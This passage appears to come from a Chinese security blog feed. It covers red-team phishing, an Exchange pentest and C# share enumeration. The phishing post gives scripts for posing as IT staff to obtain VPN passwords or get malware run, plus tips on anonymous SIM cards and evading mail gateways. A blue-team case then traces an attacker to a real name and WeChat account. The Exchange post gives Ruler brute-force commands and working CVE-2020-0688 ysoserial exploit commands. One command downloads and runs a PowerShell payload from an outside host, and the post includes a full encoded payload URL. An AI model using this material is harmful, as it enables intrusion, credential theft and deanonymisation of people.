)</li><li>删除空格后门</li><li>删除stager特征</li><li>……<h3 id="免杀木马"><a href="#免杀木马" class="headerlink" title="免杀木马"></a>免杀木马</h3>对于前期调研的内部安全防护工具，针对性的制作免杀木马，减少在免杀上面花费的时间。</li><li>二进制免杀</li><li>静态免杀</li><li>动态免杀</li></ul><p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/TideSec/BypassAntiVirus</a></p><h3 id="匿名手机卡"><a href="#匿名手机卡" class="headerlink" title="匿名手机卡"></a>匿名手机卡</h3><p>用来进行电话钓鱼，防止被防守队溯源</p><ul><li>阿里小号（<a href="https://aliqin.tmall.com/）" target="_blank" rel="noopener">https://aliqin.tmall.com/）</a></li><li>寻找卡商购买匿名卡</li></ul><h3 id="绕过邮件网关"><a href="#绕过邮件网关" class="headerlink" title="绕过邮件网关"></a>绕过邮件网关</h3><p>有的时候我们发送的邮件会被拒收或者拦截，我们要尝试绕过：</p><ul><li>附件密码以图片形式插入，而非直接写在正文当中</li><li>附件和附件密码分开发送</li><li>不接收有附件的邮件，百度网盘，火狐网盘插入到正文当中</li></ul><h2 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h2><h3 id="安全意识"><a href="#安全意识" class="headerlink" title="安全意识"></a>安全意识</h3><p>我们在诱导的前期可以检查目标员工是否有安全意识，可以先发一个无毒文件过去，若验证对方没有很强的安全意识，我们可以再发木马过去，减少被发现钓鱼攻击的可能性。</p><h3 id="话语诱导"><a href="#话语诱导" class="headerlink" title="话语诱导"></a>话语诱导</h3><ul><li><p>伪装客户诱导客服<br>你们的xxx系统/app无法登陆，我发个截图给你们看吧！<br>请你们配合我的工作！不要耽误我的时间！</p></li><li><p>伪装运维人员诱导员工<br>你好，我是(信息)安全/管理部门的xxx，后台监测到您的电脑触发了告警，请使用我们提供的工具进行清理。<br>你好，我们后台监控到您的vpn存在异常，请提供账号密码（验证码）！情况紧急！</p></li><li><p>伪装上级诱导下属员工<br>我给你发了个表格，尽快帮我整理好，等会开会需要。</p></li><li><p>伪装钓鱼邮件被发现，进行回击<br>再发一封邮件：《关于近期收到钓鱼邮件应对措施》<br>由于近期钓鱼事件频发，为了避免公司内部网络木马感染，请运行公司下发的清理程序。<br>后台会实时监控您是否运行了程序，纳入绩效考核！请立即运行程序清理！</p></li></ul><h3 id="xss漏洞诱导"><a href="#xss漏洞诱导" class="headerlink" title="xss漏洞诱导"></a>xss漏洞诱导</h3><p>XSS配合Flash或者自制木马进行钓鱼<br><a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a></p><p>或者你觉得Flash钓鱼已经过时，可以结合CS脚本进行钓鱼。<br><a href="https://github.com/TheKingOfDuck/XSS-Fishing2-CS" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/XSS-Fishing2-CS</a><br><a href="https://github.com/timwhitez/Doge-XSS-Phishing" target="_blank" rel="noopener">https://github.com/timwhitez/Doge-XSS-Phishing</a></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>我们会遇到员工下班关机或者使用的是云桌面，这个时候我们的权限第二天可能就没了，需要做好权限维持进行后续的内网渗透。</p><p>常见权限维持方法：</p><ul><li>修改注册表</li><li>修改服务（包括svchost-x…）</li><li>配置启动项</li><li>配置计划任务</li><li>Dll劫持(白加黑)</li><li>PE感染<br>……</li></ul><p>结合CS插件进行权限维持：<br><a href="https://github.com/0xthirteen/StayKit" target="_blank" rel="noopener">https://github.com/0xthirteen/StayKit</a><br><a href="https://github.com/0xthirteen/MoveKit" target="_blank" rel="noopener">https://github.com/0xthirteen/MoveKit</a></p><h2 id="后期复盘"><a href="#后期复盘" class="headerlink" title="后期复盘"></a>后期复盘</h2><p>后期需要对钓鱼的人员、获取的信息、木马的名称、邮箱的附件进行统计，方便后续的复盘以及清理。<br><img src="/2021/01/05/A-D-Phishing/after.png" alt><br>总结钓鱼中出现的问题，进行讨论给出解决方案，避免问题再次出现。</p><h1 id="蓝队溯源钓鱼流程"><a href="#蓝队溯源钓鱼流程" class="headerlink" title="蓝队溯源钓鱼流程"></a>蓝队溯源钓鱼流程</h1><p>作为防守人员，当我们收到钓鱼攻击的告警时，可以备份钓鱼样本或者邮件，分析其中能够利用的信息，如：</p><ul><li>IP/域名</li><li>邮箱</li><li>手机号</li><li>微信</li><li>QQ</li><li>支付宝</li><li>常用圈子ID</li><li>……</li></ul><p>若我们能够获取一个或者数个价值信息，可以由溯源小组开始进行溯源。</p><h2 id="溯源案例-虚假邮箱"><a href="#溯源案例-虚假邮箱" class="headerlink" title="溯源案例(虚假邮箱)"></a>溯源案例(虚假邮箱)</h2><p>背景：客户下午15:49收到钓鱼邮件，由于客户已将邮件删除，只收到了一张截图：<br><img src="/2021/01/05/A-D-Phishing/fanzhi1.png" alt><br>发送的邮件为163邮件，第一时间去查询QQ：<br><img src="/2021/01/05/A-D-Phishing/fanzhi3.png" alt><br>发现非个人使用的QQ，后续通过搜索引擎搜索该QQ号，发现账号为购买的测试账号，并且账号密码都有了。<br><img src="/2021/01/05/A-D-Phishing/fanzhi4.png" alt></p><p>登陆该账号的163邮箱，成功登陆，发现已发送的大量钓鱼邮件，可以看到也发了其他防守厂商的邮件。<br><img src="/2021/01/05/A-D-Phishing/fanzhi5.png" alt><br>网易邮箱可以查看登陆的地址，不过现在看不了IP了，这里可以看见攻击者在15:01登陆了该邮箱，可以猜测为北京的攻击队。<br><img src="/2021/01/05/A-D-Phishing/fanzhi6.png" alt></p><p>在邮件中获取攻击者的exe样本，放到沙箱上去分析，分析出攻击者的服务器IP地址：<br><img src="/2021/01/05/A-D-Phishing/fanzhi2.png" alt></p><p>这期间尝试过通过该IP从web层面反制，端口开发的比较少，没有思路，通过whois也没有查询出有价值的信息。</p><p>后来想到去尝试用zoomeye/shodan这样的搜索引擎去搜索IP，最终在FOFA上发现绑定的域名，其实也就是IP反查域名，当时没有第一时间想到这个点。<br><img src="/2021/01/05/A-D-Phishing/fanzhi7.png" alt></p><p>ping该域名与我们沙箱查出来的IP一致，再次搜索该域名，查到攻击者真实姓名：<br><img src="/2021/01/05/A-D-Phishing/fanzhi8.png" alt></p><p>访问该域名，为攻击者的博客地址，只留下了一个tg的用户名：<br><img src="/2021/01/05/A-D-Phishing/fanzhi9.png" alt></p><p>翻来覆去博客上也没有其他有价值的信息，没办法，通过两个ID查询也没有搜索出价值信息，看来攻击者隐藏的不错。</p><p>后续想着(既然你有博客，一般博客都有可能是通过Github搭建的，于是将博客地址放到Github上搜索)，搜索到博客的子域名。</p><p><img src="/2021/01/05/A-D-Phishing/fanzhi10.png" alt></p><p>这里攻击者的ID又变了，到目前为止有了3个ID。</p><p>当查到这里的时候，再想一想，Github还能提供什么有价值的信息？</p><p>由于Github会保留近期Git上项目的邮箱地址，可以通过该接口反查到邮箱：<a href="https://github.com/paulirish/github-email" target="_blank" rel="noopener">https://github.com/paulirish/github-email</a></p><p><img src="/2021/01/05/A-D-Phishing/fanzhi11.png" alt></p><p>继续搜索该gmail邮箱，搜索到twitter，定位到攻击者的家乡为四川省，并且发现和之前相同的ID。<br><img src="/2021/01/05/A-D-Phishing/fanzhi12.png" alt></p><p><img src="/2021/01/05/A-D-Phishing/fanzhi13.png" alt></p><p>到了现在我们搜索到攻击者的服务器IP、域名、真实姓名、邮箱以及4个ID号，最终通过猜解微信ID成功获取攻击者的微信，并且微信名称也为其中的一个ID。</p><p><img src="/2021/01/05/A-D-Phishing/fanzhi14.png" alt></p><p>整个溯源过程流程图如下<br><img src="/2021/01/05/A-D-Phishing/fanzhi15.png" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>钓鱼攻击已经成为攻防演练中的一个重要的、也是很常见的攻击方式，所以对于攻击方来说，明白溯源的思路，能够让我们更好的隐藏自己；防守方也可以猜解攻击者的习惯、以及攻击手法去进行溯源或者反制；对于参与攻防演习的甲方，可以配置邮件网关、沙箱等物理设备防范钓鱼攻击，同时可以组织内部钓鱼项目，提高员工安全意识。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着攻防演练的进行，外网能够直接进入内网必定会越来越困难，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。&lt;/p&gt;
&lt;p&gt;钓鱼的手法有很多种，其中我们会遇到各种各样的问题，
      
    
    </summary>
    
    
    
      <category term="钓鱼" scheme="http://sherlocz.github.io/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>exchange基础渗透</title>
    <link href="http://sherlocz.github.io/2021/01/04/exchange-pentent/"/>
    <id>http://sherlocz.github.io/2021/01/04/exchange-pentent/</id>
    <published>2021-01-04T02:15:08.000Z</published>
    <updated>2021-01-11T06:04:25.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="定位exchange-server"><a href="#定位exchange-server" class="headerlink" title="定位exchange server"></a>定位exchange server</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q IMAP/*</span><br></pre></td></tr></table></figure><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>可直接抓包爆破，不过后续会有验证码验证，可尝试其他接口进行爆破嗷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ecp</span><br><span class="line">/ews</span><br><span class="line">/oab</span><br><span class="line">/owa</span><br><span class="line">/rpc</span><br><span class="line">/api</span><br><span class="line">/mapi</span><br><span class="line">/powershell</span><br><span class="line">/autodiscover</span><br><span class="line">/Microsoft-Server-ActiveSync</span><br></pre></td></tr></table></figure></p><h2 id="Ruler"><a href="#Ruler" class="headerlink" title="Ruler"></a>Ruler</h2><p>爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruler.exe --insecure --url https://exchange.hacke.testla</span><br><span class="line">b/autodiscover/autodiscover.xml brute --users user.txt --passwords pass1.txt --v</span><br><span class="line">erbose</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/04/exchange-pentent/ruler.png" alt></p><p>导出邮箱</p><h1 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h1><p>将HTTP版本主机修改成1.0<br>去掉HOST头，可获取内网ip地址<br><img src="/2021/01/04/exchange-pentent/ip.png" alt></p><p>使用nmap脚本获取主机信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap IP -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll</span><br></pre></td></tr></table></figure></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><p>漏洞影响如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010 Service Pack 3</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure></p><p>这个漏洞是2020年3月份出的漏洞，所以在这之前的小版本都没有</p><p>我这里安装的为 <strong>Exchange Server 2016 CU14</strong> ， 发布日期是在 2019 年 9 月 17 日</p><p><a href="https://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/" title="https://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/">环境搭建链接</a></p><p>漏洞利用的前提是要获取一个Exchange的邮箱用户，我这里使用mail/Aa123456账号举例子</p><p>首先，可以使用<a href="https://github.com/zcgonvh/CVE-2020-0688" title="https://github.com/zcgonvh/CVE-2020-0688" target="_blank" rel="noopener">平头哥的工具</a>进行探测探测出存在漏洞</p><p><img src="/2021/01/04/exchange-pentent/vul.png" alt></p><p>接下来需要构造我们反序列化的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--validationalg = SHA1（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--generator=B97B4E27（基本默认）</span><br><span class="line"></span><br><span class="line">--viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</span><br></pre></td></tr></table></figure></p><p>除了viewstateuserkey这个值我们需要获取，其实其他的值基本上为默认的，无需改变</p><p>登陆我们域用户的邮箱，请求 /ecp/default.aspx </p><p><img src="/2021/01/04/exchange-pentent/default.png" alt></p><p>可以在我们请求中看到cookie值，我们需要cookie中的ASP.NET_SessionId值</p><p>接下来使用ysoserial.net构造反序列化内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#调用计算器</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#写入文件</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c echo test &gt; C:\1.txt&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#判断出网</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping xxx.dnslog.io&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#反弹CS</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://xx.xx.xx.xx/a&apos;))&quot;  --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure><p><img src="/2021/01/04/exchange-pentent/calc.png" alt></p><p>将生成的反序列化内容进行url编码，最终构造出的url如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2fwEylAcAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC2BTw%2feG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2bDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8%2bDQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2bDQo8L09iamVjdERhdGFQcm92aWRlcj4LiS1M1wqJue%2b7G01o9Xv39is4dIc%3d</span><br></pre></td></tr></table></figure></p><p>访问url，报错500，其实成功<br><img src="/2021/01/04/exchange-pentent/500.png" alt></p><p>登陆Exchange邮服，成功调用calc.exe</p><p><img src="/2021/01/04/exchange-pentent/calc.png" alt></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/228735.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/228735.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;定位exchange-server&quot;&gt;&lt;a href=&quot;#定位exchange-server&quot; class=&quot;headerlink&quot; title=&quot;定位exchange server&quot;&gt;&lt;/a&gt;定位exchange server&lt;/h1&gt;&lt;figure class
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="exchange" scheme="http://sherlocz.github.io/tags/exchange/"/>
    
  </entry>
  
  <entry>
    <title>CSharp学习--sharpshares代码分析</title>
    <link href="http://sherlocz.github.io/2020/12/22/sharpshares-code/"/>
    <id>http://sherlocz.github.io/2020/12/22/sharpshares-code/</id>
    <published>2020-12-22T07:43:03.000Z</published>
    <updated>2020-12-22T10:10:09.942Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub地址：<a href="https://github.com/djhohnstein/SharpShares" title="https://github.com/djhohnstein/SharpShares" target="_blank" rel="noopener">SharpShares</a></p><p>使用Visual Studio编译，运行效果(域环境)如下，列出了域内所有机器的共享，分为Unreadable Shares(不可读的)和Listable Shares(可读的)：<br><img src="/2020/12/22/sharpshares-code/xiaoguo.png" alt></p><h1 id="原理流程图"><a href="#原理流程图" class="headerlink" title="原理流程图"></a>原理流程图</h1><p><img src="/2020/12/22/sharpshares-code/process.png" alt></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在我们看到不会的方法的时候，可以去参考官方文档：<a href="https://docs.microsoft.com/zh-cn/dotnet/api" title="https://docs.microsoft.com/zh-cn/dotnet/api" target="_blank" rel="noopener">dotnetapi查询</a></p><p>先来看看几段关键代码</p><p>测试代码1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">#获取当前域</span><br><span class="line">Console.WriteLine(&quot;Current DC :&quot; + Domain.GetCurrentDomain());</span><br><span class="line">#获取本机用户名</span><br><span class="line">Console.WriteLine(&quot;Current User:&quot; + WindowsIdentity.GetCurrent().Name.Split(&apos;\\&apos;)[1]);</span><br><span class="line">#判断当前是否是System权限</span><br><span class="line">Console.WriteLine(&quot;IsSystem:&quot; + WindowsIdentity.GetCurrent().IsSystem);</span><br><span class="line">#获取当前token id</span><br><span class="line">Console.WriteLine(&quot;Current Token:&quot; + WindowsIdentity.GetCurrent().Token);</span><br><span class="line">#获取当前主机名</span><br><span class="line">Console.WriteLine(&quot;Host Name:&quot; + System.Net.Dns.GetHostName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>效果如下：<br><img src="/2020/12/22/sharpshares-code/1.png" alt></p><p>测试代码2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">#获取当前机器的ip，首先利用GetHostName方法获取主机名，将主机名作为参数传入GetHostAddresses中</span><br><span class="line">IPAddress[] ips = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName());</span><br><span class="line">    foreach (IPAddress ip in ips)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!ip.ToString().Contains(&quot;:&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;&#123;0&#125;: &#123;1&#125;&quot;, System.Net.Dns.GetHostName(), ip);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>效果如下：<br><img src="/2020/12/22/sharpshares-code/2.png" alt></p><p>测试代码3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line">using System.DirectoryServices.ActiveDirectory;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Net.NetworkInformation;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Security.Principal;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        #region External Calls</span><br><span class="line">        [DllImport(&quot;Netapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        static extern int NetApiBufferFree(IntPtr Buffer);</span><br><span class="line">        [DllImport(&quot;Netapi32.dll&quot;, CharSet = CharSet.Unicode)]</span><br><span class="line">        private static extern int NetShareEnum(</span><br><span class="line">             StringBuilder ServerName,</span><br><span class="line">             int level,</span><br><span class="line">             ref IntPtr bufPtr,</span><br><span class="line">             uint prefmaxlen,</span><br><span class="line">             ref int entriesread,</span><br><span class="line">             ref int totalentries,</span><br><span class="line">             ref int resume_handle</span><br><span class="line">             );</span><br><span class="line">        #endregion</span><br><span class="line">        #region External Structures</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span><br><span class="line">        public struct SHARE_INFO_1</span><br><span class="line">        &#123;</span><br><span class="line">            public string shi1_netname;</span><br><span class="line">            public uint shi1_type;</span><br><span class="line">            public string shi1_remark;</span><br><span class="line">            public SHARE_INFO_1(string sharename, uint sharetype, string remark)</span><br><span class="line">            &#123;</span><br><span class="line">                this.shi1_netname = sharename;</span><br><span class="line">                this.shi1_type = sharetype;</span><br><span class="line">                this.shi1_remark = remark;</span><br><span class="line">            &#125;</span><br><span class="line">            public override string ToString()</span><br><span class="line">            &#123;</span><br><span class="line">                return shi1_netname;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        #endregion</span><br><span class="line">        const uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;</span><br><span class="line">        const int NERR_Success = 0;</span><br><span class="line">        private enum NetError : uint</span><br><span class="line">        &#123;</span><br><span class="line">            NERR_Success = 0,</span><br><span class="line">            NERR_BASE = 2100,</span><br><span class="line">            NERR_UnknownDevDir = (NERR_BASE + 16),</span><br><span class="line">            NERR_DuplicateShare = (NERR_BASE + 18),</span><br><span class="line">            NERR_BufTooSmall = (NERR_BASE + 23),</span><br><span class="line">        &#125;</span><br><span class="line">        private enum SHARE_TYPE : uint</span><br><span class="line">        &#123;</span><br><span class="line">            STYPE_DISKTREE = 0,</span><br><span class="line">            STYPE_PRINTQ = 1,</span><br><span class="line">            STYPE_DEVICE = 2,</span><br><span class="line">            STYPE_IPC = 3,</span><br><span class="line">            STYPE_SPECIAL = 0x80000000,</span><br><span class="line">        &#125;</span><br><span class="line">        public static SHARE_INFO_1[] EnumNetShares(string Server)</span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;SHARE_INFO_1&gt; ShareInfos = new List&lt;SHARE_INFO_1&gt;();</span><br><span class="line">            int entriesread = 0;</span><br><span class="line">            int totalentries = 0;</span><br><span class="line">            int resume_handle = 0;</span><br><span class="line">            int nStructSize = Marshal.SizeOf(typeof(SHARE_INFO_1));</span><br><span class="line">            IntPtr bufPtr = IntPtr.Zero;</span><br><span class="line">            StringBuilder server = new StringBuilder(Server);</span><br><span class="line">            int ret = NetShareEnum(server, 1, ref bufPtr, MAX_PREFERRED_LENGTH, ref entriesread, ref totalentries, ref resume_handle);</span><br><span class="line">            if (ret == NERR_Success)</span><br><span class="line">            &#123;</span><br><span class="line">                IntPtr currentPtr = bufPtr;</span><br><span class="line">                for (int i = 0; i &lt; entriesread; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    SHARE_INFO_1 shi1 = (SHARE_INFO_1)Marshal.PtrToStructure(currentPtr, typeof(SHARE_INFO_1));</span><br><span class="line">                    ShareInfos.Add(shi1);</span><br><span class="line">                    currentPtr += nStructSize;</span><br><span class="line">                &#125;</span><br><span class="line">                NetApiBufferFree(bufPtr);</span><br><span class="line">                return ShareInfos.ToArray();</span><br><span 